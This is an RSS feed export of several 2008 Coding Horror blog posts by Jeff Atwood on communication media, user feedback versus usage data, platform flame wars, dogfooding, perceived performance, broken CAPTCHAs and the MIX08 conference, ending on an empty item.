<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
<channel>
<title>Coding Horror</title>
<description>programming and human factors</description>
<link>https://blog.codinghorror.com/</link>
<pubDate>Sun, 19 Apr 2020 00:00:01 GMT</pubDate>
<!-- other elements omitted from this example -->
<item>
<title><![CDATA[ On Escalating Communication ]]></title>
<link>https://blog.codinghorror.com/on-escalating-communication/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>I'm a big fan of <a href="http://twitter.com/">Twitter</a>. The service itself is nothing revolutionary; it's essentially public instant messaging. But don't underestimate the power of taking a previously siloed, private one-to-one communication medium and <a href="http://www.codinghorror.com/blog/archives/000840.html">making it public</a>. Why talk to one person when you could talk to <i>anyone</i> who happens to be interested in that particular topic? Granted, there are plenty of topics that should only be discussed in private. But in my experience, those are the exception, not the rule. You should always try to <a href="http://www.codinghorror.com/blog/archives/000854.html">maximize the value of your keystrokes</a>.</p>
<p>However, <b>instant messaging, even the public kind, still has its limitations as a communication medium</b>. Consider this exchange between <a href="http://haacked.com">Phil Haack</a> and Scott Bellware. I follow Phil on Twitter, but not Scott, so one side of this conversation (and note that this is just a partial fragment) showed up in my Twitter stream.</p>
<img alt="image placeholder" >
<p>I'm bringing this up because I've made the very same mistake with instant messaging –  having an intense, extended conversation long after it should have been beyond obvious to any observer that <b>I needed to escalate the discussion to a more appropriate communication medium.</b></p>
<p>Let me be completely honest with you –  I'm actually sugar coating this a bit. I would get into <a href="http://www.codinghorror.com/blog/archives/000247.html">knock down, drag out fights</a> over IM where I became <i>physically angry</i>. And for what? If I had taken the time to walk over to my coworker's desk or call him on the phone, this "argument" could have been defused in a sane, rational way, with no hurt feelings or residual anger on either side.</p>
<p>Because I abused instant messaging, because I wasn't brave enough to address the serious limitations of instant messaging as a communication medium, I ultimately hurt <i>myself</i>. And other people. It's all so… unnecessary.</p>
<p>Please don't make the same mistake I have. <b>Understand the limitations of the communication medium you are using</b> and know when to escalate to another, more appropriate one.</p>
<p>Email is no different. Take it <a href="http://webworkerdaily.com/2008/02/24/feature-interview-with-gtd-author-david-allen-on-health-and-stress/">from Getting Things Done guru, David Allen</a>:</p>
<blockquote>
<p>One of the problems that's endemic with the younger generation people who have grown up with computers and with email <b>they make the assumption that email is a fine medium for communicating anything and everything.</b></p>
<p>But one of the things we've learned is that if you try to communicate something that requires a broader bandwidth of communication, in other words I actually really need to see what you look like when I say something and how you respond to it. Otherwise you might very easily misunderstand what was going on.</p>
<p>For people that are trying to do strategic or sensitive or complex things through email and it's the wrong pipe to be using, that's very easy to blow a fuse. In terms of the stress, the misunderstandings, the conflict, the sort of lack of fulfillment or lack of getting a result that may occur because of it. [It's] a factor with anybody who assumes that email is the communication media of choice.</p>
</blockquote>
<p>I'm not going to tackle <a href="http://www.codinghorror.com/blog/archives/000394.html">the subject of email etiquette</a> or the much sketchier topic of instant messaging etiquette –  if there even is such a thing. It's murky, nebulous, and complicated. Just <a href="http://www.codinghorror.com/blog/archives/000906.html">be civil to each other</a> and treat people's time as the precious commodity it is, even if they don't realize it.</p>
<p>Understand the strengths and weaknesses of the particular communication medium you've chosen. Don't doggedly pursue the same method of communication when you've clearly outgrown it. They do not stretch to fit.</p>
<p><b>Know when to escalate from IM to email, from email to phone, and when to drop the ultimate communication A-bomb: a face-to-face meeting.</b> Sometimes people are hesitant to escalate communications even when it's painfully obvious that they should. Resist the urge to reply in kind, however tempting it may be. You'll both have a more productive conversation when one of you finds the wherewithal to escalate to "let's take this to email", "let me call you", or even "let's meet for coffee".</p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-02-24T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/on-escalating-communication/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ I Repeat: Do Not Listen to Your Users ]]></title>
<link>https://blog.codinghorror.com/i-repeat-do-not-listen-to-your-users/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Paul Buchheit on
<a href="http://paulbuchheit.blogspot.com/2008/02/most-import-thing-to-understand-about.html">listening to users</a>:
</p>
<p>
</p>
<blockquote>
I wrote the first version of Gmail in one day. It was not very impressive. All I did was stuff my own email into the Google Groups (Usenet) indexing engine. I sent it out to a few people for feedback, and they said that it was somewhat useful, but it would be better if it searched over their email instead of mine. That was version two. After I released that people started wanting the ability to respond to email as well. That was version three. That process went on for a couple of years inside of Google before we released to the world.
<p>
Startups don't have hundreds of internal users, so it's important to release to the world much sooner. When <a href="http://friendfeed.com/">FriendFeed</a> was semi-released (private beta) in October, the product was only about two months old (and 99.9% written by two people, Bret and Jim). We've made a lot of improvements since then, and the product that we have today is much better than what we would have built had we not launched. The reason? <b>We have users, and we listen to them, and we see which things work and which don't.</b>
</p>
</blockquote>
<p>
Listening to users is a tricky thing. Users often don't know what they want, and even if they did, the <a href="http://www.codinghorror.com/blog/archives/001048.html">communication is likely to get garbled</a> somewhere between them and you. By no means should you <i>ignore</i> your users, though. Most people will silently and forever walk away if your software or website doesn't meet their needs. The users who care enough to give you feedback deserve your attention and respect. They're essentially taking it upon themselves to design your product. If you don't listen attentively and politely respond to all customer feedback, you're setting yourself up for eventual failure.
</p>
<p>
It's rude not to listen to your users. So how do we reconcile this with the first rule of usability-- <a href="http://www.useit.com/alertbox/20010805.html"><b>Don't Listen to Users</b>?</a>
</p>
<p>
</p>
<blockquote>
To discover which designs work best, watch users as they attempt to perform tasks with the user interface. This method is so simple that many people overlook it, assuming that there must be something more to usability testing. [It] boils down to the basic rules of usability:
<p>
</p>
<ul>
<li>Watch what people actually do.
</li>
<li>Do not believe what people <i>say</i> they do.
</li>
<li>Definitely don't believe what people predict they <i>may</i> do in the future.
</li>
</ul>
</blockquote>
<p>
I think Paul had it right, but it's easy to miss. The relevant phrase in Paul's post is <b>we see which things work</b>, which implies measurement and <i>correlation</i>. There's no need to directly watch users (although it never hurts) when you have detailed logs showing what they actually did. Collect user feedback, then correlate it with <a href="http://www.useit.com/alertbox/application-mistakes.html">data on what those users are actually doing</a>:
</p>
<p>
</p>
<blockquote>
Don't just implement feature requests from "user representatives" or "business analysts." The most common way to get usability wrong is to <b>listen to what users say rather than actually watching what they do.</b> Requirement specifications are always wrong. You must prototype the requirements quickly and show users something concrete to find out what they really need.
</blockquote>
<p>
Acting on user feedback alone is questionable. No matter how well intentioned, you're guessing. Why guess when you can take actions based on cold, hard data? Acting on user feedback <i>and</i> detailed usage metrics for your application or website-- that's the gold standard.
</p>
<p>
Consider Valve software's <a href="http://www.steampowered.com/status/survey.html">hardware survey</a>. A particularly vocal set of gamers might demand support for extremely high widescreen resolutions such as 1920 x 1200 or 2560 x 1600. Understandable, since they've spent a lot of money on high-end gaming rigs. But what resolutions do most people actually play at?
</p>
<p>
<a href="http://www.steampowered.com/status/survey.html"><img alt="image placeholder" >
</p>
<p>
Based on this survey of 1.3 million Steam users, about 10% of gamers have high resolution, widescreen displays. There are other reasons you might want to satisfy this request, of course. Those 10% tend to be the most dedicated, influential gamers. But having actual data behind your user feedback lets you vet the actions you take, to ensure that you're spending your development budget wisely. The last thing you want to do is fritter away valuable engineering time on features that almost nobody is using, and having usage data is how you tell the difference.
</p>
<p>
Valve also collects an exhaustive set of gameplay statistics for their games, such as <a href="http://en.wikipedia.org/wiki/Team_Fortress_2">Team Fortress 2</a>.
</p>
<p>
</p>
<blockquote>
We've traditionally relied on things like written feedback from players to help decide which improvements to focus on. More recently, Steam has allowed us to collect more information than was previously possible. TF2 includes a reporting mechanism which tells us details about how people are playing the game. We're <a href="http://steampowered.com/status/tf2/tf2_stats.php">sharing the data we collect</a> because we think people will find it interesting, and because we expect to spot emergent problems earlier, and ultimately build better products and experiences as a result.
</blockquote>
<p>
The very first graph, of <b>time played per class</b>, illustrates one problem with Team Fortress 2 in a way that I don't think any amount of player feedback ever could.
</p>
<p>
</p>
<table cellpadding="4" cellspacing="4" width="225">
<tr>
<td>Scout</td>
<td align="right">17.5%</td>
</tr>
<tr>
<td>Engineer</td>
<td align="right">17.3%</td>
</tr>
<tr>
<td>Soldier</td>
<td align="right">15%</td>
</tr>
<tr>
<td>Demoman</td>
<td align="right">10.5%</td>
</tr>
<tr>
<td>Sniper</td>
<td align="right">10.1%</td>
</tr>
<tr>
<td>Heavy</td>
<td align="right">8.5%</td>
</tr>
<tr>
<td>Spy</td>
<td align="right">8%</td>
</tr>
<tr>
<td>Pyro</td>
<td align="right">7%</td>
</tr>
<tr>
<td>Medic</td>
<td align="right"><font color="red">5.5%</font></td>
</tr>
</table>
<p>
The medic class is severely underrepresented in actual gameplay. I suppose this is because Medics don't engage in much direct combat, so they're not as exciting to play as, say, a Demoman or Soldier. That's unfortunate, because the healing abilities of the medic class are frequently critical to winning a round.  So what did Valve do? They released <a href="http://www.ubercharged.net/2008/01/29/new-medic-achievements-already-hidden-on-your-pc/">a giant set of medic-specific achievements</a> to encourage players to choose the Medic class more often. That's iterative game design based on actual, real world gameplay data.
</p>
<p>
Using detailed gameplay metrics to refine game design isn't new; <a href="http://www.wired.com/gaming/virtualworlds/magazine/15-09/ff_halo?currentPage=all">Bungie ran both Halo 2 and 3 through comprehensive usability lab tests</a>.
</p>
<p>
</p>
<blockquote>
<img alt="image placeholder" >
<p>
In April, Bungie found a nagging problem with Valhalla, one of Halo 3's multiplayer levels: Player deaths (represented in dark red on this "heat map" of the level) were skewing toward the base on the left, indicating that forces invading from the right had a slight advantage. After reviewing this image, designers tweaked the terrain to give both armies an even chance.
</p>
</blockquote>
<p>
Again-- try to imagine how you'd figure out this fundamental map imbalance based on player feedback. I'm not sure if it's even possible.
</p>
<p>
<b>Make sure your application or website is capturing user activity in a useful, meaningful way</b>. User feedback is important. Don't get me wrong. But never take action <i>solely</i> based on user feedback. Always have some kind of user activity data to corroborate and support the valuable user feedback you're getting.  Ignoring your user feedback may be setting yourself up for eventual failure, but blindly acting on every user request is <i>certain</i> failure.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-02-25T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/i-repeat-do-not-listen-to-your-users/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Douchebaggery ]]></title>
<link>https://blog.codinghorror.com/douchebaggery/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
<a href="http://en.wikipedia.org/wiki/David_Heinemeier_Hansson">David Heinemeier Hansson</a> has a problem with <a href="http://www.loudthinking.com/arc/000433.html">Windows as a programming platform</a>.
</p>
<p>
</p>
<blockquote>
While I can certainly understand the reasons why some people go with Linux, I have run all but dry of understanding for programmers that willfully pick Windows as their platform of choice. I know a few that are still stuck in the rut for various reasons -- none of them desire.
<p>
I would have a hard time imagining hiring a programmer who was still on Windows for 37signals. If you don't care enough about your tools to get the best, your burden of proof just got a lot heavier.
</p>
<p>
So if you haven't switched already, stop procrastinating. Get it over with. If you have any desire working for the rising rank of companies building their business on open source technologies, you don't want to carry a liability like that around on you resume. Being labeled a 2005 Switcher is bad enough.
</p>
</blockquote>
<p>
Strong invective indeed, but that's David's style. To be fair, his larger point-- that if you care about open source programming, you'll use <b>a platform friendly to open source software</b> -- is reasonably valid, though I'd expect hard core OSS folks to <a href="http://www.codinghorror.com/blog/archives/001044.html">want Freedom Zero</a> in their operating system as well as the software they build. If I felt <i>that</i> strongly about OSS, I'd actually view people who held on to the platform lockdown of OS X <a href="http://diveintomark.org/archives/2006/06/02/when-the-bough-breaks">with mild suspicion</a>, myself.
</p>
<p>
Still, is it necessary to paint with such a broad brush? To imply that programmers using Windows "don't care enough about their tools to get the best"? I have a pretty thick skin based on the psychic scars of the thousands of petty internet <a href="http://www.codinghorror.com/blog/archives/000247.html">religious wars</a> I've participated in, and this one even ruffles my feathers a little. I take issue with David's claim that, when it comes to computers and operating systems, there's any "best" anything. In my considered opinion, <a href="http://www.codinghorror.com/blog/archives/000796.html">they all suck</a>. Sure, there are tradeoffs, pros and cons, strengths and weaknesses. But an objective <i>best</i>? It's all relative.
</p>
<p>
Before you jump all over David, do read his two followup posts (<a href="http://groups.google.com/group/comp.lang.ruby/msg/12318b8d5e7ad8af">one</a>, <a href="http://groups.google.com/group/comp.lang.ruby/msg/475d868d9f86302c">two</a>) on the Ruby mailing list, which explain his position in a more coherent, less incendiary way. The argument that 37Signals wouldn't hire a programmer running Windows has as much to do with culture as anything else. It's like showing up to a job interview with Coca-Cola casually sipping a Pepsi. David, unfortunately, <b>felt the need to turn this job requirement into a statement of taste</b>. He declared Coca-Cola the morally and aesthetically superior choice, instead of the simple preference for one type of sugar water over another that it really is.
</p>
<p>
That post was written in March 2005, but David expressed the same sentiments in <a href="http://java.sys-con.com/read/313594.htm">a 2007 technology prediction piece</a>.
</p>
<p>
</p>
<blockquote>
Apple will continue to trounce everyone else for the preferred geek platform. <b>The stigma of being a Web programmer still using Windows</b> will increase.
</blockquote>
<p>
Here's what I don't understand about statements like this. They have exactly the opposite effect that the speaker probably intends. There are two possible reactions:
</p>
<p>
</p>
<ol>
<li>Wow, David's right. I made the wrong choice in my career. It's high time I looked into OS X and Rails programming. They sound great!
</li>
<li>F****************k you.
</li>
</ol>
<p>
Guess which reaction is more common? Actually, there's no need to guess, as I can guarantee every Windows programmer reading this is thinking #2 right now. As <a href="http://www.codinghorror.com/blog/archives/000737.html">an evangelist looking</a> to increase adoption of your platform, this is a remarkably poor strategy. When has abusing people into agreeing with you ever worked?
</p>
<p>
Of course, as David has said many, many times, <a href="http://blog.wekeroad.com/2007/10/10/imploding-rails-jesus-dhh-and-the-uncle-ben-principle/">he doesn't care whether we agree with him or not</a>. Well, not in so many words, but you get the idea:
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
<b>I actually admire this sentiment</b>, as I've seen too many people get so wrapped up in what other people think of them that they can't bear to have an original opinion about anything. But if you accept the premise that this kind of statement won't change anyone's mind, and is ultimately ineffective-- even counterproductive-- what are we left with? What purpose does the statement "stigma of being a Windows developer" serve? I can only think of one: <b>David gets off on putting other people down.</b>
</p>
<p>
And that makes him kind of a douchebag.
</p>
<p>
Which also means when you're using Rails and OS X, you're using the platform of <i>choice</i> for douchebags.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I used to be an avid <a href="http://en.wikipedia.org/wiki/Samurai_Shodown_II">Samurai Shodown II</a> player. I played as Earthquake, the impossibly fat, impossibly Texan ninja. I got so good with Earthquake that I could beat all comers in the small Boulder, Colorado arcade I frequented. This led a frustrated player to remark:
</p>
<p>
</p>
<blockquote>
You suck! You're kicking our ass with the worst character in the game!
</blockquote>
<p>
Indeed. There's nothing more satisfying than kicking someone's ass with the worst character in the game. After playing this remarkably well balanced fighting game for a while, I realized that every selectable character had their strengths and weaknesses. Playing well meant understanding your character and maximizing your strengths while exploiting your opponent's weaknesses. If you were clever and patient enough, <i>you could beat any character with any other character</i>. That was skill.
</p>
<p>
<b>Don't waste time arguing about the character select screen</b>. Results speak loudest. Show the world what you can do in <i>your</i> programming environment of choice.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-02-26T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/douchebaggery/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ UsWare vs. ThemWare ]]></title>
<link>https://blog.codinghorror.com/usware-vs-themware/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
<a href="http://www.telepath.com/~dennison/Ted/TED.html">Ted Dennison</a> left this astute comment in response to <a href="http://www.codinghorror.com/blog/archives/001063.html">Do Not Listen to Your Users</a>:
</p>
<p>
</p>
<blockquote>
Generally when I go talk to users, it is to educate myself enough to <i>become</i> a user like them. Then I can see what needs doing, what needs streamlining, reorganizing, rearranging, etc.
</blockquote>
<p>
This brought to mind Eric Sink's claim that there are <a href="http://www.ericsink.com/articles/Yours_Mine_Ours.html">three categories of software</a>:
</p>
<p>
</p>
<ol>
<li>
<b>MeWare</b><br>The developer creates software.  The developer uses it.  Nobody else does.
</li>
<li>
<b>ThemWare</b><br>The developer creates software.  Other people use it.  The developer does not.
</li>
<li>
<b>UsWare</b><br>The developer creates software.  Other people use it.  The developer uses it too.
</li>
</ol>
<p>
ThemWare is how most software gets developed, with predictably disastrous results:
</p>
<p>
</p>
<blockquote>
If I am building software that I don't use and don't know <i>how</i> to use for people I don't understand or even like, how good is my software going to be?
<p>
I probably see every feature in terms of how difficult it will be to implement, rather than how valuable it will be for my users. I probably find myself wanting to label or document the features using my jargon instead of theirs. I probably create features that are tedious or unintuitive for my users. I can't imagine why the user interface I designed doesn't make sense to them.
</p>
</blockquote>
<p>
I've found that <b>much of the best software is the best because the programmers are the users, too. It is UsWare.</b>
</p>
<p>
It behooves software developers to understand users, to walk a mile in their shoes. If we can bridge the gap between users and ourselves-- even if only a little-- we start slowly converting our mediocre ThemWare into vastly superior UsWare. To really care about the software you're writing, you have to become a user, at least in spirit.
</p>
<p>
Consuming the software you're creating is colloquially known as <b>dogfooding</b> in programming circles. Unless you're (un)lucky enough to be writing software intended for other software developers, <a href="http://www.codinghorror.com/blog/archives/000287.html">dogfooding can be a challenge</a>. But it's worth it. Dogfooding keeps software developers honest. <b>Why work against your users by producing ThemWare when you could work <i>alongside</i> them to build UsWare?</b>
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-02-28T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/usware-vs-themware/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Actual Performance, Perceived Performance ]]></title>
<link>https://blog.codinghorror.com/actual-performance-perceived-performance/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
If you've used Windows Vista, you've probably noticed that <b>Vista's file copy performance is noticeably worse than Windows XP</b>. I know it's one of the first things I noticed. Here's the irony-- Vista's file copy is based on an improved algorithm and <a href="http://blogs.zdnet.com/Bott/?p=369&amp;page=2">actually performs <i>better</i> in most cases than XP</a>. So how come it seems so darn slow?
</p>
<p>
Let's start with Mark Russinovich's typically excellent and exhaustively in-depth <a href="http://blogs.technet.com/markrussinovich/archive/2008/02/04/2826167.aspx">analysis of Vista's file copy algorithm</a>:
</p>
<p>
</p>
<blockquote>
Perhaps the biggest drawback of the [new Vista file copy algorithm], and the one that has caused many Vista users to complain, is that for copies involving a large group of files between 256KB and tens of MB in size, <b>the perceived performance of the copy can be significantly worse than on Windows XP</b>. That's because the previous algorithm's use of cached file I/O lets Explorer finish writing destination files to memory and dismiss the copy dialog long before the Cache Manager's write-behind thread has actually committed the data to disk. With Vista's non-cached implementation, Explorer is forced to wait for each write operation to complete before issuing more, and ultimately for all copied data to be on disk before indicating a copy's completion. In Vista, Explorer also waits 12 seconds before making an estimate of the copy's duration and the estimation algorithm is sensitive to fluctuations in the copy speed, both of which exacerbate user frustration with slower copies.
</blockquote>
<p>
As Mark wryly notes, <a href="http://www.codinghorror.com/blog/archives/000592.html">file copying is not as easy as it might first appear</a>. As with so many things in life, perception is reality: if users see file copying as slower, it <i>is</i> slower. Despite all the algorithmic improvements, in spite of the superior file copy benchmark results, Vista's file copy performance is worse than Windows XP.
</p>
<p>
I couldn't ask for a more perfect example of this dirty little human factors secret: <b>perceived performance is more important than actual performance</b>. Fancy copy algorithms won't necessarily help you build a fast progress bar. But understanding how your users' brains work definitely will, as illustrated in <a href="http://chrisharrison.net/projects/progressbars/index.html">Rethinking the Progress Bar</a>:
</p>
<p>
</p>
<blockquote>
Humans do not perceive the passage of time in a linear way. This, coupled with the irregular behavior of progress bars, causes human perception of process duration to vary. <b>An understanding of which behaviors perceptually
shorten or lengthen process duration can be used to engineer a progress bar that appears faster, even though the actual duration remains unchanged.</b> This paper describes an experiment that sought to identify patterns in user perception of progress bar behavior. The results are then analyzed to classify behaviors that perceptually speed up or slow down process execution.
</blockquote>
<p>
The <a href="http://chrisharrison.net/projects/progressbars/ProgBarHarrison.pdf">study</a> (pdf) used eight progress behavior functions, then tracked users' reactions to each one.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
Although <b>all the progress bars took exactly the same amount of time</b> in the test, two characteristics made users think the process was faster, even if it wasn't:
</p>
<p>
</p>
<ol>
<li>progress bars that moved smoothly towards completion
</li>
<li>progress bars that sped up towards the end
</li>
</ol>
<p>
It seems obvious in retrospect why Vista's file copy design failed so miserably, and needed to be patched up with Service Pack 1. It's a textbook example of these principles at work:
</p>
<p>
</p>
<ol>
<li>Explorer waits 12 seconds before providing a copy duration estimate, which certainly provides no sense of smooth progress.
</li>
<li>The copy dialog is not dismissed until the write-behind thread has committed the data to disk, which means the copy is slowest at the end.
</li>
</ol>
<p>
The idea that performance is determined largely by the user's perception rather than actual wall-clock time can be liberating. Like a magician using skillful sleight of hand to perform magic tricks, you can seemingly alter reality. But it can also be frustrating. Even if you get the technical parts right, with hard benchmark data to back you up, subtle human perceptual factors can still negate your work, as those unfortunate Vista developers found out. <a href="http://blogs.zdnet.com/Bott/?p=377">What's a poor developer to do?</a>
</p>
<p>
</p>
<blockquote>
But are both of us missing the real point of owning and using a PC? Can any stopwatch-based measurement of isolated tasks as performed by individual hardware and software components really measure the worth of a technology investment? I don't think so.
<p>
This is not a new question for me. Back in the early 1990s, when I was editor of the late, lamented PC Computing, we differentiated our product reviews from those of sister public PC Magazine by focusing on usability. The highly regarded PC Magazine Labs was the quintessential "speeds and feeds" shop. We focused on usability, going to the extreme of spending a small fortune (I still remember the budget battles) building a state-of-the-art usability lab and hiring usability professionals to run it.
</p>
</blockquote>
<p>
Don't make the same mistake the Vista development team did. Think more holistically than mere benchmarks alone. <b>Consider the user's perception of the process, too</b>. I recommend Tog's <a href="http://www.asktog.com/basics/03Performance.html">Maximizing Human Performance</a> as a great starting point.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-02T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/actual-performance-perceived-performance/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ CAPTCHA is Dead, Long Live CAPTCHA! ]]></title>
<link>https://blog.codinghorror.com/captcha-is-dead-long-live-captcha/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
In November 2007 <a href="http://www.codinghorror.com/blog/archives/001001.html">I called these three CAPTCHA implementations "unbreakable"</a>:
</p>
<p>
</p>
<table>
<tr>
<td valign="top">Google<br>(unbreakable)
</td>
<td valign="top">
<img alt="image placeholder" >
</td>
</tr>
<tr>
<td valign="top">Hotmail<br>(unbreakable)
</td>
<td valign="top">
<img alt="image placeholder" >
</td>
</tr>
<tr>
<td valign="top">Yahoo<br>(unbreakable)
</td>
<td valign="top">
<img alt="image placeholder" >
</td>
</tr>
</table>
<p>
2008 is shaping up to be a very bad year indeed for CAPTCHAs:
</p>
<p>
</p>
<ul>
<li>Jan 17: <a href="http://www.informationweek.com/news/showArticle.jhtml?articleID=205900620">InformationWeek reports Yahoo CAPTCHA broken</a>
</li>
<li>Feb 6: <a href="http://www.websense.com/securitylabs/blog/blog.php?BlogID=171">Websense reports Hotmail CAPTCHA broken</a>
</li>
<li>Feb 22: <a href="http://www.websense.com/securitylabs/blog/blog.php?BlogID=174">Websense reports Google CAPTCHA broken</a>
</li>
</ul>
<p>
Which means I am now 0 for 3. Understand that <b>I am no fan of CAPTCHA</b>. <a href="http://www.codinghorror.com/blog/archives/000712.html">I view them as a necessary and important evil</a>, one of precious few things separating average internet users from a torrential deluge of email, comment, and forum spam.
</p>
<p>
So reading that the three best CAPTCHA implementations have been defeated sort of breaks my heart. Even what I consider to be the strongest, Google's implementation, <a href="http://www.websense.com/securitylabs/blog/blog.php?BlogID=174">fell hard</a>:
</p>
<p>
</p>
<blockquote>
On average, only 1 in every 5 CAPTCHA breaking requests are successfully including both algorithms used by the bot, approximating a success rate of 20%.
</blockquote>
<p>
A twenty percent success rate doesn't sound like much, but these spammers are harnessing networks of compromised PCs to send out thousands upon thousands of simultaenous sign-up requests to GMail, Hotmail, and Yahoo Mail from computers all over the world. Even a <i>five percent</i> success rate against a particular email service CAPTCHA would be cause for serious concern; with twenty percent success rate you might as well put a fork in that thing-- it's done.
</p>
<p>
In the meantime, CAPTCHA still serves a useful purpose-- speed bumps that prevent evil bots and the nefarious people who run them from <i>completely</i> overrunning the internet, <a href="http://blogs.iss.net/archive/CAPTCHA.html">as Gunter Ollman notes</a>:
</p>
<p>
</p>
<blockquote>
CAPTCHAs were a good idea, but frankly, in today's profit-motivated attack environment they have largely become irrelevant as a protection technology. Yes, the CAPTCHAs can be made stronger, but they are already too advanced for a large percentage of Internet users. Personally, I don't think it's really worth strengthening the algorithms used to create more complex CAPTCHAs Ã¢â‚¬â€œ instead, just deploy them as a small "speed-bump" to stop the script-kiddies and their unsophisticated automated attack tools. CAPTCHAs aren't the right tool for stopping today's commercially minded attackers.
</blockquote>
<p>
There's simply too much money to be made in email spam for the commercial CAPTCHA algorithms, regardless of how good they may be, to survive forever. How old is Google's CAPTCHA now? Two to three years old? In the short term, <b>perhaps proliferation and evolution of many different CAPTCHA techniques is the most effective prevention</b>. You should <i>emulate</i> the techniques from the most effective and human-readable industrial grade commercial CAPTCHA, but avoid copying them outright. Otherwise, when they're inevitably broken, you're broken too. CAPTCHA defeating tools are tailored to very specific inputs; if there's little to no monetary incentive, odds are nobody will bother to customize one for yours. My ridiculously simple "orange" comment form protection is ample evidence of that.
</p>
<p>
Beyond diversification, the deeper question remains: <b>how do we tell automated bots from people-- without alienating our users in the process?</b> How can we build a next generation CAPTCHA that's less vulnerable to attack?
</p>
<p>
Here's some food for thought:
</p>
<p>
</p>
<ul>
<li>
<a href="http://research.microsoft.com/asirra/">Distinguish pictures of dogs from cats</a>
</li>
<li>
<a href="http://gs264.sp.cs.cmu.edu/cgi-bin/esp-pix">Choose a word that relates to all the images</a>
</li>
<li>
<a href="http://www.thephppro.com/products/captcha/">ASCII art</a>
</li>
<li>
<a href="http://recaptcha.net/learnmore.html">Solve failed OCR inputs</a>
</li>
<li>Trivia questions
</li>
<li>Math and word problems
</li>
</ul>
<p>
At some point, unfortunately, CAPTCHA devolves from a simple human reading test into an intelligence test or an acuity test. Depending on how invasive you want to be, you'll eventually be forced to <a href="http://www.codinghorror.com/blog/archives/000785.html">move to two-factor authentication</a>, like sending a text message to someone's cell phone with a temporary key.
</p>
<p>
I don't have the all answers, but one thing is for sure: I hate spammers. As fellow spam-hating internet users we all have a vested interest in <b>seeing CAPTCHA techniques evolve to defeat spammers</b>.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-04T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/captcha-is-dead-long-live-captcha/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ See You at MIX08! ]]></title>
<link>https://blog.codinghorror.com/see-you-at-mix08/</link>
<content><![CDATA[ 
                <!--kg-card-begin: markdown--><p>
Well, you won't technically see <i>me</i> at <a href="http://visitmix.com/2008/">MIX08</a> this year. But you will see some <a href="http://www.vertigo.com/mix">very cool top-secret stuff Vertigo created</a> in the keynote.
</p>
<p>
<a href="http://visitmix.com/2008/"><img alt="image placeholder" >
</p>
<p>
<b>MIX is by far my favorite Microsoft conference</b> after attending the '06 and '07 iterations. And not just because this year they have <a href="http://visitmix.com/blogs/News/437/">a Rock Band competition</a>* and <a href="http://visitmix.com/blogs/News/The-King-of-Kongs-Steve-Wiebe-joins-MIX08-for-a-special-screening-of-the-movie-and-an-attempt-to-rec/">a screening of The King of Kong with star Steve Wiebe</a>. Oh, and did I mention the exclusive MIX party at <a href="http://www.taolasvegas.com/">the Tao nightclub</a>? These things certainly don't hurt.
</p>
<p>
What I love about Mix is that it ...
</p>
<p>
</p>
<ul>
<li>is relatively small and intimate, at around 2,000 attendees.
</li>
<li>seamlessly merges software engineering and design.
</li>
<li>includes a lot of non-Microsoft folks, even those that are traditionally hostile to Microsoft, so there's plenty of perspective.
</li>
</ul>
<p>
And it's in Las Vegas. Although I find gambling dreadfully boring (hey, maybe <i>that's</i> another reason why <a href="http://twitter.com/codinghorror/statuses/766773242">I never got into World of Warcraft</a>), there's always something fun to do.
</p>
<p>
If you work in the Microsoft stack, and any of that sounds even vaguely interesting -- <b>sign up for next year's MIX</b> when you can. You won't be disappointed. In fact, I guarantee satisfaction. If you attend MIX and don't thoroughly enjoy the experience, then I dare say there's something wrong with <i>you</i>.
</p>
<p>
A team at Vertigo has been working at breakneck pace over the last two months to <b>build something extra-special that will be shown in the MIX keynote</b>. Of course I can't talk about it until the actual keynote Wednesday morning, but I will give you this one hint: it invokes the power of <i>rock</i>. Details will be available on <a href="http://www.vertigo.com/mix.aspx">Vertigo's MIX page</a> in time with the keynote.
</p>
<p>
Our fearless leader, <a href="http://blogs.vertigo.com/personal/scott/Blog/default.aspx">Scott Stanfield</a>, will also be delivering a blacklisted MIX session on Friday, which expands on what we're showing in the keynote. Be sure to mark this one on your calendar if you're in attendance.
</p>
<p>
<img alt="image placeholder" >
</p>
<p>
I've been specifically told <i>"it'll be epic; wear your pampers."</i> Duly noted.
</p>
<p>
* Which Vertigo is <i>totally</i> going to win. You read it here first.
</p>
<p>
</p>
<p></p>
<!--kg-card-end: markdown-->
             ]]></content>
<pubDate>2008-03-05T12:00:00.000Z</pubDate>
<guid>https://blog.codinghorror.com/see-you-at-mix08/</guid>
<author><![CDATA[ Jeff Atwood ]]></author>
</item>
<item>
<title><![CDATA[ Death Threats, Intimidation, and Blogging ]]></title>
